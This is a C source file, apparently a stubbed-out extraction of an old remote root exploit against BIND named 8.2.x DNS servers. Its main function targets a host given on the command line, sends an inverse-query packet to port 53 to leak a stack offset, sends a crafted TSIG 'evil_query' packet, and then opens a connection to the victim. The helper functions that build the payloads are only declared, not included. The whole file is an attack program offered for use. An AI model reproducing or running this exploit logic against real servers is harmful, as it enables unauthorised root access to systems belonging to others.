
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {long s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; void* sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int socklen_t ;
typedef int sa ;


 void* AF_INET ;
 int BUFFSIZE ;
 int SOCK_DGRAM ;
 scalar_t__ close (int) ;
 int connection (struct sockaddr_in) ;
 int evil_query (char*,long) ;
 int htons (int) ;
 int infoleak_qry (char*) ;
 int memcpy (unsigned char*,long*,int) ;
 int printf (char*,...) ;
 int recvfrom (int,char*,int,int ,struct sockaddr*,int*) ;
 long resolve_host (char*) ;
 int sendto (int,char*,int,int ,struct sockaddr*,int) ;
 int socket (void*,int ,int ) ;
 long xtract_offset (char*,int) ;

int main(int argc, char* argv[])
{
 struct sockaddr_in sa;
 int sock;
 long address;
 char buff[BUFFSIZE];
 int len, i;
 long offset;
 socklen_t reclen;
 unsigned char foo[4];

 printf("[*] named 8.2.x (< 8.2.3-REL) remote root exploit by lucysoft, Ix\n");
 printf("[*] fixed by ian@cypherpunks.ca and jwilkins@bitland.net\n\n");

 address = 0;
 if (argc < 2)
 {
  printf("[*] usage : %s host\n", argv[0]);

  return(-1);
 }

 if (!(address = resolve_host(argv[1])))
 {
  printf("[x] unable to resolve %s, try using an IP address\n", argv[1]);
  return(-1);
 } else {
  memcpy(foo, &address, 4);
  printf("[*] attacking %s (%d.%d.%d.%d)\n", argv[1], foo[0], foo[1], foo[2], foo[3]);
 }

 sa.sin_family = AF_INET;

 if (0 > (sock = socket(sa.sin_family, SOCK_DGRAM, 0)))
 {
  return(-1);
 }

 sa.sin_family = AF_INET;
 sa.sin_port = htons(53);
 sa.sin_addr.s_addr= address;


 len = infoleak_qry(buff);
 printf("[d] infoleak_qry was %d long\n", len);
 len = sendto(sock, buff, len, 0 , (struct sockaddr *)&sa, sizeof(sa));
 if (len < 0)
 {
  printf("[*] unable to send iquery\n");
  return(-1);
 }

 reclen = sizeof(sa);
 len = recvfrom(sock, buff, BUFFSIZE, 0, (struct sockaddr *)&sa, &reclen);
 if (len < 0)
 {
                printf("[x] unable to receive iquery answer\n");
                return(-1);
 }
 printf("[*] iquery resp len = %d\n", len);

 offset = xtract_offset(buff, len);
 printf("[*] retrieved stack offset = %x\n", offset);


 len = evil_query(buff, offset);
 if(len < 0){
  printf("[x] error sending tsig packet\n");
  return(0);
 }

 sendto(sock, buff, len, 0 , (struct sockaddr *)&sa, sizeof(sa));

 if (0 > close(sock))
 {
  return(-1);
 }

 connection(sa);

 return(0);
}
